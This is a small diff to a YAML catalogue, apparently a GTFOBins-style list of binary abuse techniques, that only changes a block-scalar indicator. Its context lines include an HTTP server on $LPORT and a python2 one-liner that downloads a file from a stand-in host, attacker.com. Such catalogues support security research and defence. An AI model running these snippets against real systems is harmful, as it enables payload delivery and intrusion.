@@ -18,7 +18,7 @@ functions:
         python2 -m SimpleHTTPServer $LPORT
   download:
     - description: Fetch a remote file via HTTP GET request.
-      code: |-
+      code: |
         export URL=http://attacker.com/file_to_get
         export LFILE=where_to_save
         python2 -c 'import urllib as u,os.environ as e;u.urlretrieve(e["URL"], e["LFILE"])'
